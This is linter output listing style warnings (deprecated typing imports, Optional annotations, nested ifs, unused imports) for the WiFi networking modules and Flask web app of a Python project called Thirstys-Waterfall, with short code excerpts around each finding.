209 |     def get_mesh_status(self) -> Dict[str, Any]:
    |                                  ^^^^
210 |         """Get mesh network status"""
211 |         return {
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\mesh_networking.py:244:40
    |
242 |             return False
243 |
244 |     def _identify_bottlenecks(self) -> List[str]:
    |                                        ^^^^
245 |         """Identify nodes with high traffic load"""
246 |         bottlenecks = []
    |
help: Replace with `list`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\spectrum_analyzer.py:6:1
  |
4 | import statistics
5 | from dataclasses import dataclass
6 | from typing import Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\spectrum_analyzer.py:6:1
  |
4 | import statistics
5 | from dataclasses import dataclass
6 | from typing import Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\spectrum_analyzer.py:120:32
    |
118 |     }
119 |
120 |     def __init__(self, config: Optional[Dict] = None):
    |                                ^^^^^^^^^^^^^^
121 |         self.config = config or {}
122 |         self.logger = logging.getLogger(self.__class__.__name__)
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\spectrum_analyzer.py:120:41
    |
118 |     }
119 |
120 |     def __init__(self, config: Optional[Dict] = None):
    |                                         ^^^^
121 |         self.config = config or {}
122 |         self.logger = logging.getLogger(self.__class__.__name__)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\spectrum_analyzer.py:124:35
    |
122 |         self.logger = logging.getLogger(self.__class__.__name__)
123 |
124 |         self.channel_data_2_4ghz: Dict[int, ChannelInfo] = {}
    |                                   ^^^^
125 |         self.channel_data_5ghz: Dict[int, ChannelInfo] = {}
126 |         self.channel_data_6ghz: Dict[int, ChannelInfo] = {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\spectrum_analyzer.py:125:33
    |
124 |         self.channel_data_2_4ghz: Dict[int, ChannelInfo] = {}
125 |         self.channel_data_5ghz: Dict[int, ChannelInfo] = {}
    |                                 ^^^^
126 |         self.channel_data_6ghz: Dict[int, ChannelInfo] = {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\spectrum_analyzer.py:126:33
    |
124 |         self.channel_data_2_4ghz: Dict[int, ChannelInfo] = {}
125 |         self.channel_data_5ghz: Dict[int, ChannelInfo] = {}
126 |         self.channel_data_6ghz: Dict[int, ChannelInfo] = {}
    |                                 ^^^^
127 |
128 |         self.enable_dfs = self.config.get("enable_dfs", False)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\spectrum_analyzer.py:130:54
    |
128 |         self.enable_dfs = self.config.get("enable_dfs", False)
129 |
130 |     def analyze_spectrum(self, band: str = "all") -> Dict[str, List[ChannelInfo]]:
    |                                                      ^^^^
131 |         """Analyze WiFi spectrum for specified band(s)"""
132 |         results = {}
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\spectrum_analyzer.py:130:64
    |
128 |         self.enable_dfs = self.config.get("enable_dfs", False)
129 |
130 |     def analyze_spectrum(self, band: str = "all") -> Dict[str, List[ChannelInfo]]:
    |                                                                ^^^^
131 |         """Analyze WiFi spectrum for specified band(s)"""
132 |         results = {}
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\spectrum_analyzer.py:148:34
    |
146 |         return results
147 |
148 |     def _analyze_2_4ghz(self) -> Dict[int, ChannelInfo]:
    |                                  ^^^^
149 |         """Analyze 2.4 GHz spectrum (channels overlap)"""
150 |         channel_data = {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\spectrum_analyzer.py:172:32
    |
170 |         return 20.0 if channel in [1, 6, 11] else 60.0
171 |
172 |     def _analyze_5ghz(self) -> Dict[int, ChannelInfo]:
    |                                ^^^^
173 |         """Analyze 5 GHz spectrum (non-overlapping)"""
174 |         channel_data = {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\spectrum_analyzer.py:195:32
    |
193 |         return channel_data
194 |
195 |     def _analyze_6ghz(self) -> Dict[int, ChannelInfo]:
    |                                ^^^^
196 |         """Analyze 6 GHz spectrum (WiFi 6E/7 - clean spectrum)"""
197 |         channel_data = {}
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\spectrum_analyzer.py:215:10
    |
213 |     def get_optimal_channel(
214 |         self, band: str, bandwidth_mhz: int = 20
215 |     ) -> Optional[ChannelInfo]:
    |          ^^^^^^^^^^^^^^^^^^^^^
216 |         """Get optimal channel for specified band"""
217 |         channels = self._get_channel_data(band)
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\spectrum_analyzer.py:234:47
    |
232 |         return best_channel
233 |
234 |     def _get_channel_data(self, band: str) -> Dict[int, ChannelInfo]:
    |                                               ^^^^
235 |         """Get channel data for band"""
236 |         if band == "2.4ghz":
    |
help: Replace with `dict`

SIM116 Use a dictionary instead of consecutive `if` statements
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\spectrum_analyzer.py:236:9
    |
234 |       def _get_channel_data(self, band: str) -> Dict[int, ChannelInfo]:
235 |           """Get channel data for band"""
236 | /         if band == "2.4ghz":
237 | |             return self.channel_data_2_4ghz
238 | |         elif band == "5ghz":
239 | |             return self.channel_data_5ghz
240 | |         elif band == "6ghz":
241 | |             return self.channel_data_6ghz
    | |_________________________________________^
242 |           return {}
    |

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\spectrum_analyzer.py:244:38
    |
242 |         return {}
243 |
244 |     def get_spectrum_report(self) -> Dict:
    |                                      ^^^^
245 |         """Generate comprehensive spectrum report"""
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:11:1
   |
 9 | from dataclasses import dataclass
10 | from enum import Enum
11 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:11:1
   |
 9 | from dataclasses import dataclass
10 | from enum import Enum
11 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:40:22
   |
38 |     interface_name: str
39 |     mac_address: str
40 |     supported_bands: List[WiFiBand]
   |                      ^^^^
41 |     supported_standards: List[WiFiStandard]
42 |     max_speed_mbps: int
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:41:26
   |
39 |     mac_address: str
40 |     supported_bands: List[WiFiBand]
41 |     supported_standards: List[WiFiStandard]
   |                          ^^^^
42 |     max_speed_mbps: int
43 |     supports_monitor_mode: bool
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:63:15
   |
61 |     frequency_mhz: int
62 |     signal_strength_dbm: int
63 |     security: List[str]  # WPA2, WPA3, OWE, etc.
   |               ^^^^
64 |     max_rate_mbps: int
65 |     bandwidth_mhz: int  # 20, 40, 80, 160
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:84:32
   |
82 |     """
83 |
84 |     def __init__(self, config: Optional[Dict[str, Any]] = None):
   |                                ^^^^^^^^^^^^^^^^^^^^^^^^
85 |         self.config = config or {}
86 |         self.logger = logging.getLogger(self.__class__.__name__)
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:84:41
   |
82 |     """
83 |
84 |     def __init__(self, config: Optional[Dict[str, Any]] = None):
   |                                         ^^^^
85 |         self.config = config or {}
86 |         self.logger = logging.getLogger(self.__class__.__name__)
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:90:24
   |
89 |         # Detected adapters and networks
90 |         self.adapters: List[WiFiAdapter] = []
   |                        ^^^^
91 |         self.available_networks: List[WiFiNetwork] = []
92 |         self.connected_network: Optional[WiFiNetwork] = None
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:91:34
   |
89 |         # Detected adapters and networks
90 |         self.adapters: List[WiFiAdapter] = []
91 |         self.available_networks: List[WiFiNetwork] = []
   |                                  ^^^^
92 |         self.connected_network: Optional[WiFiNetwork] = None
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:92:33
   |
90 |         self.adapters: List[WiFiAdapter] = []
91 |         self.available_networks: List[WiFiNetwork] = []
92 |         self.connected_network: Optional[WiFiNetwork] = None
   |                                 ^^^^^^^^^^^^^^^^^^^^^
93 |
94 |         # Performance settings
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:157:10
    |
155 |     def _get_adapter_capabilities_linux(
156 |         self, interface: str, mac: str
157 |     ) -> Optional[WiFiAdapter]:
    |          ^^^^^^^^^^^^^^^^^^^^^
158 |         """Get detailed capabilities of Linux WiFi adapter"""
159 |         try:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:255:10
    |
253 |     def _get_adapter_capabilities_windows(
254 |         self, interface: str, mac: str
255 |     ) -> Optional[WiFiAdapter]:
    |          ^^^^^^^^^^^^^^^^^^^^^
256 |         """Get WiFi adapter capabilities on Windows"""
257 |         try:
    |
help: Convert to `X | None`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:316:21
    |
315 |                   for i, line in enumerate(lines):
316 | /                     if "Wi-Fi" in line:
317 | |                         # Next line typically has device name
318 | |                         if i + 1 < len(lines):
    | |______________________________________________^
319 |                               device_line = lines[i + 1]
320 |                               if "Device:" in device_line:
    |
help: Combine `if` statements using `and`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:332:66
    |
330 |             self.logger.error(f"macOS adapter discovery error: {e}")
331 |
332 |     def _get_adapter_capabilities_macos(self, interface: str) -> Optional[WiFiAdapter]:
    |                                                                  ^^^^^^^^^^^^^^^^^^^^^
333 |         """Get WiFi adapter capabilities on macOS"""
334 |         try:
    |
help: Convert to `X | None`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:367:13
    |
366 |               # macOS typically supports WiFi 6 on newer devices
367 | /             if "WiFi 6" in result.stdout or "ax" in result.stdout:
368 | |                 if "6E" in result.stdout:
    | |_________________________________________^
369 |                       supported_bands.append(WiFiBand.BAND_6_GHZ)
370 |                       supported_standards.append(WiFiStandard.WIFI_6E)
    |
help: Combine `if` statements using `and`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:392:46
    |
390 |             return None
391 |
392 |     def _estimate_max_speed(self, standards: List[WiFiStandard]) -> int:
    |                                              ^^^^
393 |         """Estimate maximum speed based on supported standards"""
394 |         speed_map = {
    |
help: Replace with `list`

UP015 [*] Unnecessary mode argument
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:408:68
    |
406 |         """Get driver name for Linux WiFi interface"""
407 |         try:
408 |             with open(f"/sys/class/net/{interface}/device/uevent", "r") as f:
    |                                                                    ^^^
409 |                 for line in f:
410 |                     if "DRIVER=" in line:
    |
help: Remove mode argument

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:437:35
    |
435 |         return "Windows WiFi Driver"
436 |
437 |     def scan_networks(self, band: Optional[WiFiBand] = None) -> List[WiFiNetwork]:
    |                                   ^^^^^^^^^^^^^^^^^^
438 |         """
439 |         Scan for available WiFi networks
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:437:65
    |
435 |         return "Windows WiFi Driver"
436 |
437 |     def scan_networks(self, band: Optional[WiFiBand] = None) -> List[WiFiNetwork]:
    |                                                                 ^^^^
438 |         """
439 |         Scan for available WiFi networks
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:461:42
    |
459 |             return []
460 |
461 |     def _scan_networks_linux(self, band: Optional[WiFiBand]) -> List[WiFiNetwork]:
    |                                          ^^^^^^^^^^^^^^^^^^
462 |         """Scan networks on Linux"""
463 |         networks = []
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:461:65
    |
459 |             return []
460 |
461 |     def _scan_networks_linux(self, band: Optional[WiFiBand]) -> List[WiFiNetwork]:
    |                                                                 ^^^^
462 |         """Scan networks on Linux"""
463 |         networks = []
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:487:41
    |
486 |     def _parse_scan_results_linux(
487 |         self, output: str, band_filter: Optional[WiFiBand]
    |                                         ^^^^^^^^^^^^^^^^^^
488 |     ) -> List[WiFiNetwork]:
489 |         """Parse Linux iw scan output"""
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:488:10
    |
486 |     def _parse_scan_results_linux(
487 |         self, output: str, band_filter: Optional[WiFiBand]
488 |     ) -> List[WiFiNetwork]:
    |          ^^^^
489 |         """Parse Linux iw scan output"""
490 |         networks = []
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:494:44
    |
492 |         return networks
493 |
494 |     def _scan_networks_windows(self, band: Optional[WiFiBand]) -> List[WiFiNetwork]:
    |                                            ^^^^^^^^^^^^^^^^^^
495 |         """Scan networks on Windows"""
496 |         networks = []
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:494:67
    |
492 |         return networks
493 |
494 |     def _scan_networks_windows(self, band: Optional[WiFiBand]) -> List[WiFiNetwork]:
    |                                                                   ^^^^
495 |         """Scan networks on Windows"""
496 |         networks = []
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:517:41
    |
516 |     def _parse_scan_results_windows(
517 |         self, output: str, band_filter: Optional[WiFiBand]
    |                                         ^^^^^^^^^^^^^^^^^^
518 |     ) -> List[WiFiNetwork]:
519 |         """Parse Windows netsh scan output"""
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:518:10
    |
516 |     def _parse_scan_results_windows(
517 |         self, output: str, band_filter: Optional[WiFiBand]
518 |     ) -> List[WiFiNetwork]:
    |          ^^^^
519 |         """Parse Windows netsh scan output"""
520 |         networks = []
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:524:42
    |
522 |         return networks
523 |
524 |     def _scan_networks_macos(self, band: Optional[WiFiBand]) -> List[WiFiNetwork]:
    |                                          ^^^^^^^^^^^^^^^^^^
525 |         """Scan networks on macOS"""
526 |         networks = []
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:524:65
    |
522 |         return networks
523 |
524 |     def _scan_networks_macos(self, band: Optional[WiFiBand]) -> List[WiFiNetwork]:
    |                                                                 ^^^^
525 |         """Scan networks on macOS"""
526 |         networks = []
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:550:41
    |
549 |     def _parse_scan_results_macos(
550 |         self, output: str, band_filter: Optional[WiFiBand]
    |                                         ^^^^^^^^^^^^^^^^^^
551 |     ) -> List[WiFiNetwork]:
552 |         """Parse macOS airport scan output"""
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:551:10
    |
549 |     def _parse_scan_results_macos(
550 |         self, output: str, band_filter: Optional[WiFiBand]
551 |     ) -> List[WiFiNetwork]:
    |          ^^^^
552 |         """Parse macOS airport scan output"""
553 |         networks = []
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:558:36
    |
557 |     def connect(
558 |         self, ssid: str, password: Optional[str] = None, security: Optional[str] = None
    |                                    ^^^^^^^^^^^^^
559 |     ) -> bool:
560 |         """
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:558:68
    |
557 |     def connect(
558 |         self, ssid: str, password: Optional[str] = None, security: Optional[str] = None
    |                                                                    ^^^^^^^^^^^^^
559 |     ) -> bool:
560 |         """
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:588:36
    |
587 |     def _connect_linux(
588 |         self, ssid: str, password: Optional[str], security: Optional[str]
    |                                    ^^^^^^^^^^^^^
589 |     ) -> bool:
590 |         """Connect to WiFi on Linux using NetworkManager or wpa_supplicant"""
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:588:61
    |
587 |     def _connect_linux(
588 |         self, ssid: str, password: Optional[str], security: Optional[str]
    |                                                             ^^^^^^^^^^^^^
589 |     ) -> bool:
590 |         """Connect to WiFi on Linux using NetworkManager or wpa_supplicant"""
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:596:36
    |
595 |     def _connect_windows(
596 |         self, ssid: str, password: Optional[str], security: Optional[str]
    |                                    ^^^^^^^^^^^^^
597 |     ) -> bool:
598 |         """Connect to WiFi on Windows"""
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:596:61
    |
595 |     def _connect_windows(
596 |         self, ssid: str, password: Optional[str], security: Optional[str]
    |                                                             ^^^^^^^^^^^^^
597 |     ) -> bool:
598 |         """Connect to WiFi on Windows"""
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:603:36
    |
602 |     def _connect_macos(
603 |         self, ssid: str, password: Optional[str], security: Optional[str]
    |                                    ^^^^^^^^^^^^^
604 |     ) -> bool:
605 |         """Connect to WiFi on macOS"""
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:603:61
    |
602 |     def _connect_macos(
603 |         self, ssid: str, password: Optional[str], security: Optional[str]
    |                                                             ^^^^^^^^^^^^^
604 |     ) -> bool:
605 |         """Connect to WiFi on macOS"""
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:624:29
    |
622 |             return False
623 |
624 |     def get_status(self) -> Dict[str, Any]:
    |                             ^^^^
625 |         """Get WiFi connection status"""
626 |         return {
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_controller.py:645:51
    |
643 |         return True
644 |
645 |     def optimize_channel(self, band: WiFiBand) -> Optional[int]:
    |                                                   ^^^^^^^^^^^^^
646 |         """
647 |         Analyze spectrum and select optimal channel
    |
help: Convert to `X | None`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_security.py:6:1
  |
4 | from dataclasses import dataclass
5 | from enum import Enum
6 | from typing import Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_security.py:6:1
  |
4 | from dataclasses import dataclass
5 | from enum import Enum
6 | from typing import Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_security.py:27:17
   |
26 |     protocol: WiFiSecurityProtocol
27 |     passphrase: Optional[str] = None
   |                 ^^^^^^^^^^^^^
28 |     enable_pmf: bool = True  # Protected Management Frames (802.11w)
29 |     enable_sae: bool = True  # Simultaneous Authentication of Equals (WPA3)
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_security.py:43:32
   |
41 |     def __init__(self):
42 |         self.logger = logging.getLogger(self.__class__.__name__)
43 |         self.current_security: Optional[WiFiSecurityConfig] = None
   |                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
44 |
45 |         # Security monitoring
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_security.py:46:32
   |
45 |         # Security monitoring
46 |         self.detected_threats: List[str] = []
   |                                ^^^^
47 |         self.deauth_attack_count = 0
48 |         self.evil_twin_detected = False
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_security.py:207:38
    |
205 |             return False
206 |
207 |     def get_security_status(self) -> Dict:
    |                                      ^^^^
208 |         """Get current security status"""
209 |         if not self.current_security:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_security.py:235:33
    |
233 |         }
234 |
235 |     def audit_security(self) -> Dict:
    |                                 ^^^^
236 |         """
237 |         Perform security audit
    |
help: Replace with `dict`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> external\Thirstys-Waterfall\thirstys_waterfall\wifi_network\wifi_security.py:278:9
    |
277 |           # Check SAE for WPA3
278 | /         if self.current_security.protocol in [
279 | |             WiFiSecurityProtocol.WPA3_PERSONAL,
280 | |             WiFiSecurityProtocol.WPA3_ENTERPRISE,
281 | |         ]:
282 | |             if not self.current_security.enable_sae:
    | |____________________________________________________^
283 |                   warnings.append("SAE disabled for WPA3 - not recommended")
284 |                   recommendations.append("Enable SAE for full WPA3 benefits")
    |
help: Combine `if` statements using `and`

F401 [*] `json` imported but unused
  --> external\Thirstys-Waterfall\web\app.py:45:8
   |
43 | """
44 |
45 | import json
   |        ^^^^
46 | import logging
47 | import os
   |
help: Remove unused import: `json`

F401 [*] `functools.wraps` imported but unused
  --> external\Thirstys-Waterfall\web\app.py:51:23
   |
49 | import traceback
50 | from datetime import datetime, timedelta
51 | from functools import wraps
   |                       ^^^^^
52 | from typing import Any, Dict, List, Optional, Tuple
   |
help: Remove unused import: `functools.wraps`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> external\Thirstys-Waterfall\web\app.py:52:1
   |
50 | from datetime import datetime, timedelta
51 | from functools import wraps
52 | from typing import Any, Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
53 |
54 | # Web framework and extensions
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> external\Thirstys-Waterfall\web\app.py:52:1
   |
50 | from datetime import datetime, timedelta
51 | from functools import wraps
52 | from typing import Any, Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
53 |
54 | # Web framework and extensions
   |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
  --> external\Thirstys-Waterfall\web\app.py:52:1
   |
50 | from datetime import datetime, timedelta
51 | from functools import wraps
52 | from typing import Any, Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
53 |
54 | # Web framework and extensions
   |

F401 [*] `typing.List` imported but unused
  --> external\Thirstys-Waterfall\web\app.py:52:31
   |
50 | from datetime import datetime, timedelta
51 | from functools import wraps
52 | from typing import Any, Dict, List, Optional, Tuple
   |                               ^^^^
53 |
54 | # Web framework and extensions
   |
help: Remove unused import

F401 [*] `typing.Tuple` imported but unused
  --> external\Thirstys-Waterfall\web\app.py:52:47
   |
50 | from datetime import datetime, timedelta
51 | from functools import wraps
52 | from typing import Any, Dict, List, Optional, Tuple
   |                                               ^^^^^
53 |
54 | # Web framework and extensions
   |
help: Remove unused import

F401 [*] `flask_jwt_extended.get_jwt` imported but unused
  --> external\Thirstys-Waterfall\web\app.py:61:5
   |
59 |     create_access_token,
60 |     create_refresh_token,
61 |     get_jwt,
   |     ^^^^^^^
62 |     get_jwt_identity,
63 |     jwt_required,
   |
help: Remove unused import: `flask_jwt_extended.get_jwt`

F401 [*] `flask_socketio.leave_room` imported but unused
  --> external\Thirstys-Waterfall\web\app.py:67:55
   |
65 | from flask_limiter import Limiter
66 | from flask_limiter.util import get_remote_address
67 | from flask_socketio import SocketIO, emit, join_room, leave_room
   |                                                       ^^^^^^^^^^
68 |
69 | # Core system integration
   |
help: Remove unused import: `flask_socketio.leave_room`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\web\app.py:216:25
    |
214 |             return
215 |
216 |         self.waterfall: Optional[ThirstysWaterfall] = None
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
217 |         self.system_state: Dict[str, Any] = {
218 |             "running": False,
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\web\app.py:217:28
    |
216 |         self.waterfall: Optional[ThirstysWaterfall] = None
217 |         self.system_state: Dict[str, Any] = {
    |                            ^^^^
218 |             "running": False,
219 |             "vpn": {"connected": False, "status": "disconnected"},
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\web\app.py:234:31
    |
232 |                 self.waterfall = None
233 |
234 |     def start_system(self) -> Dict[str, Any]:
    |                               ^^^^
235 |         """Start all Thirstys-Waterfall subsystems with comprehensive error handling."""
236 |         try:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\web\app.py:272:30
    |
270 |             return {"success": False, "error": str(e), "real": True}
271 |
272 |     def stop_system(self) -> Dict[str, Any]:
    |                              ^^^^
273 |         """Stop all subsystems with graceful shutdown and cleanup."""
274 |         try:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\web\app.py:301:33
    |
299 |             return {"success": False, "error": str(e), "real": True}
300 |
301 |     def restart_system(self) -> Dict[str, Any]:
    |                                 ^^^^
302 |         """Restart all subsystems (stop then start)."""
303 |         try:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
